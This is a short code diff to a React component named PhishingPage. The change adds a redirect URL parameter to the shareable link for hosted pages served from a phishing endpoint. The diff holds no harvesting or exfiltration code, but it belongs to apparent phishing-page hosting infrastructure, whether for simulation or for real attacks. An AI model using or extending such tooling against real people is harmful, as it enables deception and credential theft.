@@ -65,7 +65,7 @@ export default function PhishingPage() {
     localStorage.removeItem(storageKey);
   };
 
-  const handleHostPage = async (htmlContent: string) => {
+  const handleHostPage = async (htmlContent: string, redirectUrl: string) => {
     setIsHosting(true);
     setHostedUrl(null);
     toast({ title: "Hosting Page...", description: "Uploading content to secure host." });
@@ -76,7 +76,7 @@ export default function PhishingPage() {
         throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
       }
       
-      const url = `${window.location.origin}/api/phishing/serve/${result.pasteId}`;
+      const url = `${window.location.origin}/api/phishing/serve/${result.pasteId}?redirectUrl=${encodeURIComponent(redirectUrl)}`;
       setHostedUrl(url);
       
       toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });
